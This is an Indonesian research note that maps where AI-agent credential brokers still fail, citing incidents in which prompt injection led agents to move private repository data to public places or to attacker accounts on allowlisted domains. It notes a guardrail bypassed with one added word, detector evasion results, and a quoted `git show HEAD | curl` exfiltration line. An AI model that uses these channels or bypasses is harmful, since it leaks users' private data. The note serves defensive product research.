# Celah kompetitor untuk jalur 4 dan 5 (integrasi AI dan agent coding)

Tanggal riset 11 Nov 2026. Fokus: apa yang tetap gagal **setelah** secret berhasil disembunyikan dari agent. Catatan lama di `Secret broker agent/` sudah membuktikan bahwa "agent tidak bisa membaca secret" adalah fitur umum (Claude Code `mask`, Infisical Agent Vault, varlock, OneCLI, SIGIL, Lit, OutLayer, KeyLease). Catatan ini tidak mengulang bukti itu.

## Metode

- [Fakta] 26 pencarian web dan 22 halaman dibuka. Kalau halaman gagal dibuka (403), sumber ditandai "cuplikan saja".
- [Fakta] Cara mencari yang dipakai ada lima: keluhan pengguna (forum Cursor), batas yang diakui dokumen kompetitor (Claude Code, OneCLI, OutLayer, Lit, Prompt Shields, Codex), insiden 2025 sampai 2026, riset keamanan (Hackett dkk., Invariant, Noma, Rehberger), dan segmen yang tidak dilayani (vendor SaaS AI yang menyimpan token OAuth).
- [Fakta] `projects.json` (431 proyek) dan `new-projects-2026-11-10.json` disaring dengan kata kunci oauth, prompt injection, exfiltrat, connector, api key, credential, redact, mcp, github.

## 1. Batas yang diakui sendiri oleh kompetitor

### [Fakta]

- **OneCLI** menulis di bagian "What this does NOT protect against": "OneCLI prevents credential theft, not credential misuse." Agent yang memanggil `charges.create` di Stripe tetap lolos karena kredensialnya sah. Juga: kalau agent bisa memanggil HTTP tanpa lewat proxy, "OneCLI can't intercept them", dan root di host "can read credentials from the gateway's memory". TEE disebut sebagai roadmap jangka panjang. (https://onecli.sh/blog/credential-vault-ai-agent-security, dibuka)
- **WorkOS** (21 Sep 2026) menyebut sisa risiko desain placeholder plus egress proxy adalah "Over-broad credential scope, confused deputy", dan "a prompt injection that persuades the agent to make a different request to that same domain gets authenticated too". Desain ini "prevents exfiltration, not misuse." (https://workos.com/blog/agent-credential-architectures, dibuka)
- **Claude Code** `mask`: nilai asli disuntik ke host di `injectHosts`, atau ke semua host di `allowedDomains` bila `injectHosts` kosong. Aturan berbasis host, bukan metode, path, atau isi. `tlsTerminate` "does not add content filtering". Peringatan resmi: "Allowing broad domains such as `github.com` can create paths for data exfiltration" dan kode di sandbox "can potentially use domain fronting". Alat yang mengabaikan proxy ("plain `ssh`, most database drivers") tidak bisa terhubung sama sekali. `sandbox.credentials` "affects sandboxed Bash commands only". (https://code.claude.com/docs/en/sandboxing, dibuka)
- **varlock**: kebijakan contoh hanya `@proxy(domain="api.stripe.com")`. Yang di-scrub dari respons adalah nilai secret itu sendiri. Halaman tidak menyebut pembatasan metode atau path. (https://varlock.dev/, dibuka)
- **Lit Agent Keychain**: aksi non-export "returns a bounded result" ke agent. "Revocation affects the next request, not plaintext already received or authorized operations already running." Audit log tidak dijelaskan di `llms.txt`. (https://keychain.litprotocol.com/llms.txt, dibuka)
- **OutLayer connectors**: login pemilik "stays in the enclave", aturan diperiksa di enclave, write bisa menunggu persetujuan pemilik. Tidak ada redaksi output dari platform. Satu-satunya aturan adalah checklist penulis konektor: "Nothing in your output echoes a secret". Konektor yang ada hanya lima: mercury, gmail, github, hyperliquid, polymarket. (https://app.outlayer.ai/docs/connectors, dibuka)
- **Cursor**: staf Cursor (15 Feb 2026) menulis bahwa daftar ignore `.env*` "is currently applied only to indexing, not to agent tool calls like Read file", dan "the terminal and MCP tools used by the agent can't be blocked via `.cursorignore`". (https://forum.cursor.com/t/cursor-ide-agent-reads-env-file/151913, dibuka)
- **Codex cloud**: risiko yang diakui termasuk "Code or secret exfiltration", dengan contoh `git show HEAD | curl ... httpbin.org`. Mitigasinya membatasi metode ke `GET`, `HEAD`, `OPTIONS` dan allowlist domain. (https://learn.chatgpt.com/docs/cloud/internet-access, dibuka)
- **1Password `op run`**: dokumen menulis "You should assume that processes on your computer can access the environment of other processes run by the same user." (https://www.1password.dev/cli/secrets-environment-variables, dibuka)
- **Microsoft Prompt Shields**: "primarily trained and evaluated on English content". Deteksi document attack "is off by default". Pemindaian di titik tool response masih Preview. Hasil "No prompt attack ... doesn't establish that the request is benign". (https://learn.microsoft.com/en-us/azure/ai-services/content-safety/concepts/jailbreak-detection, dibuka, diperbarui 14 Okt 2026)
- **CaMeL**: NeuralTrust (12 Feb 2026) menulis "convincing real-world implementations remain limited". Kritik Tallam dan Miller (arXiv 2505.22852) menyebut CaMeL tidak memblokir side channel dan mengasumsikan prompt awal jinak (cuplikan saja). (https://neuraltrust.ai/blog/camel-prompt-injection, dibuka)
- **Aembit dan Astrix**: hanya materi vendor yang ditemukan. Akeyless menyebut desain secretless "does not prevent every prompt injection outcome" (cuplikan saja). Analisis independen tentang kegagalan produk Aembit atau Astrix tidak ditemukan.
- **Lakera Guard dan Prompt Security**: dokumen batasan Lakera tidak ditemukan. Prompt Security dibeli SentinelOne (pengumuman 5 Agu 2025) dan kini punya MCP gateway serta cakupan Claude Code dan Cursor (cuplikan saja, https://www.sentinelone.com/press/sentinelone-to-acquire-prompt-security/). Nilai sekitar USD 180 juta hanya dari pihak ketiga, belum diverifikasi.

### [Inferensi]

- Semua broker kredensial yang dibedah memutuskan izin per **host**. Tidak ada yang mengikat izin ke maksud tugas, asal data, atau akun tujuan. Ini pola kegagalan bersama, bukan kekurangan satu vendor.

## 2. Insiden dan riset yang tetap terjadi walau kompetitor ada

### [Fakta]

| Kasus | Tanggal | Yang gagal | Sumber |
|---|---|---|---|
| Claude Pirate: file dikirim ke akun penyerang lewat Files API di `api.anthropic.com` (allowlist default) | 28 Okt 2025 | Allowlist domain | embracethered.com (dibuka) |
| Claude Cowork: file yang terlihat agent diunggah ke akun penyerang lewat domain yang sama | 14 Jan 2026 | Allowlist domain | simonwillison.net (dibuka) |
| SOCKS5 null byte: cek allowlist lolos, koneksi ke host penyerang, v2.0.24 sampai v2.1.89 | patch 1 Apr 2026 | Sandbox lokal | pasqualepillitteri.it (dibuka) |
| GitLost: issue publik membuat agent GitHub membaca repo privat dan memposting README-nya sebagai komentar publik | 7 Jul 2026 | Izin agent sah, guardrail model | siliconangle.com (dibuka) |
| CVE-2026-54316: Claude Code memakai tujuan WebFetch Hugging Face yang sudah disetujui sebagai kanal rahasia | 5 Agu 2026 | Allowlist domain | pointguardai.com (dibuka) |
| Context.ai: token OAuth "AI Office Suite" dicuri dari AWS vendor, lalu dipakai masuk Google Workspace Vercel | Mar sampai 19 Apr 2026 | Token disimpan vendor | arcade.dev (dibuka) |
| Klue: refresh token integrasi Salesforce yang sudah tidak dipakai tetap aktif dan dicuri | Jun 2026 | Token dorman | gblock.app (dibuka) |
| Salesloft Drift: refresh token integrasi chat AI dicuri, lebih dari 700 organisasi | Agu 2025 | Token disimpan vendor | cloudsecurityalliance.org (cuplikan saja) |
| PocketOS: agent Cursor menemukan token Railway di file lain lalu menghapus database dan backup | 25 Apr 2026 | Token terlalu luas | eweek, techradar (cuplikan saja) |

- [Fakta] Kutipan Context.ai dari Arcade: "The shared failure mode is not prompt injection, not a bug in an LLM, and not an MCP protocol flaw." Karyawan memberi izin "Allow All". Vercel kemudian menjadikan variabel sensitif sebagai default.
- [Fakta] Klue: "The Klue integration had been functionally discontinued", tapi izin di org Salesforce pelanggan tetap aktif. Penyerang memakai bulk SOQL, sekitar 15 menit per tenant.
- [Fakta] GitLost: guardrail dilewati dengan menambahkan kata "additionally". Noma menyebut "the agent's context window doubles as its attack surface". Tidak ada fix dari GitHub yang disebut di artikel.
- [Fakta] Hackett dkk. (Mindgard dan Lancaster, LLMSEC 2025) menguji 6 detektor prompt injection termasuk Azure Prompt Shield dan melaporkan "up to 100% evasion success" (cuplikan saja, https://export.arxiv.org/pdf/2504.11168).
- [Fakta] Invariant Labs (2025): lewat GitHub MCP, data repo privat bocor ke PR publik, dan "many off-the-shelf prompt injection detector defenses fail to catch this attack" (cuplikan saja, https://invariantlabs.ai/blog/mcp-github-vulnerability).

### [Inferensi]

- Di GitLost dan Invariant, **token tidak pernah terlihat oleh agent**. Kebocorannya terjadi karena agent memakai izin sahnya untuk memindahkan data privat ke tempat publik. Jadi menyembunyikan secret tidak menolong sama sekali di kasus ini.
- Di Claude Pirate, Cowork, dan CVE-2026-54316, domain yang diizinkan memang benar. Yang salah adalah **akun** di domain itu (milik penyerang). Allowlist domain tidak bisa membedakan akun.

## 3. Submission NEAR yang bertabrakan

### [Fakta]

- **Banbo (#365)** menerapkan aturan CaMeL di kontrak NEAR: wallet agent membayar "only if the recipient and amount came from the owner, not from an email the agent read". Cakupannya hanya pembayaran.
- **Hushmark (#341)** memeriksa pull request GitHub untuk instruksi tersembunyi, dengan model di TEE NEAR. Ini deteksi, bukan penegakan aliran data.
- **KeyLease (#134)**: lease API key dengan batas jumlah panggilan, endpoint, masa berlaku, lewat proxy TEE. Repo tidak tercantum.
- **RedactGate (#127)** menyamarkan nomor pajak sebelum dikirim ke AI, dengan kepala log di NEAR.
- Puluhan proyek lain (Veto, Leash, AgentGuard, Chaperone, dan lainnya) membatasi pembayaran agen, bukan panggilan API non-keuangan.

### [Inferensi]

- Pelacakan asal nilai (provenance) sudah diklaim Banbo untuk pembayaran. Untuk API non-keuangan (GitHub, Gmail, database) belum ada submission yang mengklaimnya.

## 4. Celah yang ditemukan

Setiap celah dipisah menjadi Fakta (bukti) dan Inferensi (penilaian).

### Celah A. Aliran data dari baca privat ke tulis publik tidak dijaga

Satu kalimat: broker dan konektor mengizinkan tiap panggilan secara terpisah, sehingga agent yang terkena prompt injection bisa membaca data privat dengan izin sah lalu menulisnya ke tempat publik atau pihak luar.

- [Fakta] Bukti: GitLost 7 Jul 2026, Invariant GitHub MCP 2025, contoh `git show HEAD | curl` di dokumen Codex, dan pengakuan OneCLI serta WorkOS ("theft, not misuse").
- [Fakta] Yang gagal: Claude Code `mask`, varlock, OneCLI, Infisical (aturan per host). OutLayer menahan write untuk disetujui, tapi tidak menyebut pelacakan asal isi write. Prompt Shields dan detektor sejenis dibobol sampai 100% di riset Hackett.
- [Inferensi] Yang terkena: developer individu dan maintainer open source yang menjalankan agent di repo privat plus publik, dan pengguna agent email atau kalender.
- [Inferensi] Yang mungkin membayar: tim platform engineering dan keamanan. Bukti pembayaran serupa: akuisisi Prompt Security oleh SentinelOne dan Series C GitGuardian USD 50 juta (catatan `kesediaan-bayar.md`). Belum ada bukti orang membayar khusus untuk penegakan aliran data.
- [Inferensi] Peran NEAR: sedang. Penegak harus melihat respons dan request berikutnya dalam bentuk plaintext. TEE OutLayer membuat penegak itu berjalan di luar mesin yang dikuasai agent (sandbox lokal terbukti bocor 5 bulan lewat SOCKS5). Kontrak NEAR menyimpan kebijakan aliran yang tidak bisa diubah agent (function-call key hanya untuk `request`). Yield/resume memberi persetujuan manusia untuk aliran yang ditandai. Namun proxy lokal juga bisa melakukan pelacakan ini, jadi NEAR bukan satu-satunya jalan.
- [Inferensi] Originality **tinggi**: CaMeL belum punya implementasi produksi, Banbo hanya pembayaran, broker lain per host. Sustainability **sedang**: prompt injection diakui tidak bisa diperbaiki di model (Noma), tapi vendor besar (GitHub lockdown mode, Anthropic) bisa menambah aturan serupa ke produknya.

### Celah B. Allowlist domain tidak bisa membedakan akun pemilik dan akun penyerang

Satu kalimat: domain yang diizinkan (`api.anthropic.com`, Hugging Face, `github.com`) dipakai penyerang dengan API key miliknya sendiri, sehingga data keluar tanpa menyentuh domain asing.

- [Fakta] Bukti: Claude Pirate (Okt 2025), Claude Cowork (Jan 2026), CVE-2026-54316 (Agu 2026), dan peringatan resmi Claude Code soal `github.com` dan domain fronting.
- [Fakta] Yang gagal: sandbox Claude Code, Cowork, allowlist Codex, dan semua broker yang menyuntik kredensial berdasarkan host. Tidak ada dokumen kompetitor yang menyebut penolakan request yang membawa kredensial akun lain.
- [Inferensi] Yang terkena: setiap pengguna agent coding dengan sandbox jaringan aktif, karena domain penyedia model hampir selalu diizinkan.
- [Inferensi] Yang mungkin membayar: tim keamanan enterprise yang sudah memakai sandbox. Bukti pembayaran langsung tidak ditemukan.
- [Inferensi] Peran NEAR: rendah. Aturan "hanya identitas akun pemilik yang boleh keluar ke domain ini" butuh proxy yang memutus TLS dan mengenali header auth. Itu bisa dilakukan proxy lokal tanpa NEAR. Kontrak NEAR hanya berguna sebagai daftar identitas akun yang sah dan bisa diaudit.
- [Inferensi] Originality **tinggi** (belum ada produk yang mengklaimnya). Sustainability **rendah sampai sedang**: Anthropic bisa menambah satu fitur ke proxy `tlsTerminate`-nya dan celah ini tertutup.

### Celah C. Token OAuth integrasi AI ditimbun vendor dan tetap hidup setelah integrasi mati

Satu kalimat: vendor SaaS AI menyimpan refresh token berizin luas untuk banyak pelanggan di satu cloud, sehingga satu pembobolan vendor membuka semua pelanggan, dan token integrasi yang sudah tidak dipakai tetap aktif.

- [Fakta] Bukti: Context.ai dan Vercel (Mar sampai Apr 2026, izin "Allow All"), Klue (Jun 2026, integrasi "functionally discontinued" tapi token jalan), Salesloft Drift (Agu 2025), Asana MCP cross-tenant (Jun 2025, sekitar 1.000 pelanggan, cuplikan saja).
- [Fakta] Yang gagal: Aembit dan Astrix memberi token pendek ke agent milik perusahaan, bukan ke vendor pihak ketiga. Broker developer (varlock, OneCLI, Claude Code) berjalan di mesin pengguna, tidak relevan untuk vendor SaaS. OutLayer connectors menyimpan login di enclave, tapi hanya lima konektor buatan sendiri.
- [Inferensi] Yang terkena: karyawan individu yang menyambungkan akun kerja ke aplikasi AI (kasus Vercel bermula dari satu karyawan), lalu pelanggan perusahaan itu.
- [Inferensi] Yang mungkin membayar: vendor SaaS AI kecil yang harus lolos tinjauan keamanan pelanggan enterprise. Bukti pembayaran serupa: Arcade menjual otorisasi agent, Infisical Series B USD 40 juta. Kesediaan vendor kecil membayar belum diverifikasi.
- [Inferensi] Peran NEAR: **esensial**. TEE OutLayer membuat vendor bisa memakai token tanpa bisa membacanya, jadi pembobolan AWS vendor tidak membocorkan token. Kontrak NEAR bisa memegang daftar izin per pelanggan yang publik dan bisa dicabut sendiri oleh pelanggan, plus aturan mati otomatis kalau integrasi dorman N hari (kasus Klue). MPC CKD memberi kunci per pelanggan. Ini peran yang tidak bisa digantikan proxy lokal.
- [Inferensi] Originality **sedang**: konsep login di enclave sudah ada di OutLayer connectors dan Lit. Yang baru adalah sasaran vendor pihak ketiga dan aturan dormansi. Sustainability **tinggi**: polanya berulang tiap tahun sejak Heroku 2022 sampai Klue 2026, dan vendor tidak bisa memperbaikinya dengan satu patch.

### Celah D (lebih lemah). Kredensial non-HTTP (database, SSH) tidak tertangani broker

- [Fakta] Claude Code: "plain `ssh`, most database drivers" tidak bisa terhubung lewat proxy. OneCLI hanya HTTP(S) menurut pihak ketiga (dev.co, cuplikan saja). Catatan Apiiro di `kesediaan-bayar.md`: password database adalah jenis secret bocor terbanyak (379).
- [Inferensi] Originality sedang, karena Infisical Agent Vault mungkin menangani login ("logs in with them"), belum diverifikasi. Peran NEAR rendah, karena OutLayer WASI tidak punya raw socket (catatan `kelayakan-near.md`). Celah ini nyata tapi tidak cocok untuk NEAR.

### Celah E (lebih lemah). Detektor prompt injection probabilistik dan berbasis bahasa Inggris

- [Fakta] Prompt Shields utamanya dilatih bahasa Inggris dan deteksi dokumen mati secara default. Hackett dkk. melaporkan evasi sampai 100%.
- [Inferensi] Ini alasan mendukung celah A (penegakan deterministik), bukan celah terpisah. Detektor berbahasa Indonesia sendiri sulit dibela originality-nya dan tidak butuh NEAR.

## 5. Hal yang belum diverifikasi

- Status perbaikan Anthropic atas kanal Files API dan apakah `api.anthropic.com` masih diizinkan default.
- Respons resmi GitHub atas GitLost (The Hacker News 403).
- Dokumen batasan Lakera Guard, dan detail produk Astrix.
- Apakah Infisical Agent Vault mendukung protokol database.
- Apakah OutLayer connectors mencatat persetujuan on-chain.

## Cek compliance gate (NEAR.md)

- [Fakta] Tugas ini hanya riset baca publik dan menulis satu file lokal. Tidak ada submission, posting, akun, transaksi, atau deploy (gate poin 7).
- [Inferensi] Untuk build nanti: celah C paling kuat di kriteria integrasi NEAR nyata (Q-002, Q-011), celah A paling kuat di originality. Track fit belum dicek terhadap teks Build track.

## Tiga celah terbaik

1. **Celah A. Aliran baca privat ke tulis publik tidak dijaga.** Broker mengizinkan tiap panggilan per host, sehingga agent yang disuntik prompt memakai izin sahnya untuk memindahkan data privat ke tempat publik. Token tidak perlu dicuri.
   Bukti terkuat: GitLost (Noma Labs, 7 Jul 2026, agent GitHub memposting README repo privat sebagai komentar publik), ditambah OneCLI sendiri menulis "prevents credential theft, not credential misuse".
   Originality tinggi (CaMeL belum ada di produksi, Banbo #365 hanya pembayaran). Sustainability sedang (vendor besar bisa meniru). Peran NEAR sedang.
2. **Celah B. Allowlist domain tidak bisa membedakan akun.** Penyerang memakai domain yang diizinkan dengan API key miliknya sendiri.
   Bukti terkuat: tiga kasus berulang lewat domain yang diizinkan. Claude Pirate (Okt 2025) dan Claude Cowork (Jan 2026) lewat `api.anthropic.com`, lalu CVE-2026-54316 (Agu 2026) lewat Hugging Face.
   Originality tinggi. Sustainability rendah sampai sedang (Anthropic bisa menutupnya dengan satu fitur proxy). Peran NEAR rendah.
3. **Celah C. Token OAuth integrasi AI ditimbun vendor dan tetap hidup setelah integrasi mati.**
   Bukti terkuat: Context.ai ke Vercel (Mar sampai 19 Apr 2026, izin "Allow All") dan Klue (Jun 2026, integrasi "functionally discontinued" tapi refresh token tetap jalan).
   Originality sedang (OutLayer connectors dan Lit sudah menyimpan login di enclave). Sustainability tinggi (pola berulang sejak 2022). Peran NEAR esensial (TEE plus izin dan aturan dormansi di kontrak).
